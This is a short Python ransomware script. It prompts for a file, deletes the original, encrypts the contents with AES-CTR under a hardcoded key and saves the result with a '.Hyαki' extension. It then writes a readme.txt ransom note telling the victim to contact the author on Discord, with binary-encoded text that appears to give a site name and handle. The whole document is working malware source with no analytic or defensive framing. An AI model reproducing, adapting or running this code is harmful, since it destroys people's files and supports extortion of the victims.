import os
import binascii
import pyaes

arquivo = input('File: ')
novo_arquivo = arquivo + ".Hyαki"
key = b"AMBoHuzchyfJMLqG"

file = open(arquivo,"rb")
file_data = file.read()
file.close()
os.remove(arquivo)

aes = pyaes.AESModeOfOperationCTR(key)
crypto_data = aes.encrypt(file_data)
crypto_data_hex = binascii.hexlify(crypto_data)

new_file = open(novo_arquivo,"wb")
new_file.write(crypto_data)
new_file.close()

texto = b"Your files have been encrypted to retrieve them. \nSend me a message on discord.\n"
arte = b'''
01101011 01101110 01101111 01110111 01101110 01100101 01110100 01110111
01101111 01110010 01101011 01110011 00101110 01101110 01100101 01110100

01001000 01111001 11001110 10110001 01101011 01101001 01101101 11001110 10110001 01110010 01101111 00100011 00110011 00110101 00110101 00110101.
'''
texto+=arte
arquivo_texto = open("readme.txt","wb")
arquivo_texto.write(texto)
arquivo_texto.close()